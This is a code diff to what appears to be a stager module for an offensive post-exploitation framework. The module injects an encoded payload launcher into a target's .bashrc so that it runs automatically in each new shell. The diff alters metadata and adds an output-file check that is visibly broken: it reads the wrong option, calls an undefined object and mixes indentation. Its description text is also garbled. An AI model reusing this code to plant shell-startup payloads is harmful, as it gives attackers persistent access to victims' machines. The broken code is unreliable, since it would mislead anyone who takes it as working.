@@ -6,9 +6,9 @@ class Stager:
         self.info = {
             'Name': 'Bashrc file',
 
-            'Author': ['@Matt Homjxie'],
+            'Author': '@homjxie',
 
-            'Description': ('Generate Script in file .bashrc execute Payload Automatic Once the file is dropped in Path Home In file Target.'),
+            'Description': ('Generate Stager in file .bashrc Language Code a execute to show File Stager .bashrc Ctrl With H | And in Powershell execute Via Cmder New Console With bash::bash.'),
 
             'Comments': [
                 'https://twitter.com/homjxi0e'
@@ -63,7 +63,7 @@ class Stager:
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
-
+	OutFile = self.options['SafeChecks']['Value']
 
 
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
@@ -72,8 +72,12 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
 
+	if OutFile == "":
+            print Path.color("[!] Error In Path Man !!! .")
+            return ""
+
         else:
-	    script = "#Matt homjxi0e\n"
+	    script = "#execute Stager Via .bashrc And Powershell execute Via Cmder New Console With bash::bash\n\n"
 
 	    script += "%s\n" %(launcher)
 
